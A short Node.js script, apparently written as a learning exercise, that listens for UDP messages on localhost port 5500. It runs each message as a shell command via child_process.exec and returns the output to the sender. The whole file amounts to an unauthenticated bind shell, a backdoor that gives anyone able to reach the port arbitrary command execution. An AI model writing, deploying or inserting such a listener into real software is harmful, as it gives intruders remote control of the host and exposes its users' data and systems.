import { info } from 'console';
import dgram from 'dgram'
import { exit } from 'process';
import { exec } from 'child_process';

const port = 5500;
const host = "127.0.0.1";
const socket = dgram.createSocket("udp4");

// Listen for incoming connnections. (best to always specify an ip otherwise will default to listen on all ips)
socket.bind(port, host, () => { 
    console.log(`Listening...\n`)
});


// Handling Connections
socket.on("message", (cmd, info) => {
    // Can print buffer as-is - but changing to strin to we have access to JS methods (need to remove newlines)
    cmd = cmd.toString('utf8');

    if (cmd == "exit") { 
        console.log("Exiting!");
        exit(0);
    }

    exec(cmd, (err, stdout, stderr) => {
        if (err) {
            // node couldn't execute the command
            return;
        }
        else {
            socket.send(stdout, info.port)
        }
    });


});